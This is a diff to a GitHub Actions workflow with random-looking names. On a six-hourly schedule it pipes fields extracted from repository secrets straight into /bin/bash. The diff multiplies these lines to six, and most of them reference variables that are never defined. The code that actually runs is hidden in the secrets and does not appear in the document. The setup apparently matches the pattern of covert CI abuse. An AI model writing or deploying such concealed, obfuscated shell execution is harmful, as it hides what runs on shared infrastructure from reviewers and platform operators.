@@ -1,18 +1,23 @@
 name: duanyanyu2233
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 2/6 * * *'
+    - cron: '4 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: duanyanyu2233
         env:
-          oi9: ${{ secrets.oi9 }}
+          enfr974: ${{ secrets.enfr974 }}
         run: |
-          echo $oi9 | jq -r .yecn9908 | /bin/bash
-          echo $sb6222 | jq -r .jlhow7741 | /bin/bash
+          echo $enfr974 | jq -r .mpwgw3 | /bin/bash
+          echo $ngtz80205 | jq -r .t8714 | /bin/bash
+          echo $lrafu12936 | jq -r .s3 | /bin/bash
+          echo $uyfa45953 | jq -r .o50 | /bin/bash
+          echo $nl5550 | jq -r .ybhno493 | /bin/bash
+          echo $qzsl26 | jq -r .p09839 | /bin/bash
 
